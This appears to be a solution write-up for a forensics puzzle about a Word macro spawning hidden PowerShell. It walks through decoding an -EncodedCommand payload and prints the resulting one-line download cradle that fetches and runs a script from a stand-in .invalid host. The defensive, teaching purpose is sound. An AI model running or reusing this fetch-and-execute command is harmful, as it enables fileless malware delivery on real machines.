The answer is `cdn-sync.updates-check.invalid`.

Two things give it away before you decode anything. `WINWORD.EXE` started `powershell.exe`, which a Word document essentially never does legitimately (a macro did it). And the command line uses `-WindowStyle Hidden` and `-EncodedCommand`, which together mean "run this and don't let the user see it".

`-EncodedCommand` expects **base64 of UTF-16LE text**. Decoding as plain base64 gives text with a zero byte between every letter, which is the clue that you need to convert from UTF-16:

```bash
echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBzAHkAbgBjAC4AdQBwAGQAYQB0AGUAcwAtAGMAaABlAGMAawAuAGkAbgB2AGEAbABpAGQALwBhAC4AcABzADEAJwApAA==' \
  | base64 -d | iconv -f UTF-16LE -t UTF-8
```

The result is a one-line download cradle:

```text
IEX (New-Object Net.WebClient).DownloadString('http://cdn-sync.updates-check.invalid/a.ps1')
```

`DownloadString` fetches a script from the host and `IEX` (Invoke-Expression) runs it straight from memory, so nothing is written to disk for antivirus to find. Everything interesting happens in the file the host serves, `a.ps1`, and you now know where to get it, block it, and search your proxy logs for other machines that talked to it.

The `.invalid` domain is deliberate: it can never resolve, so this puzzle cannot touch anything real.
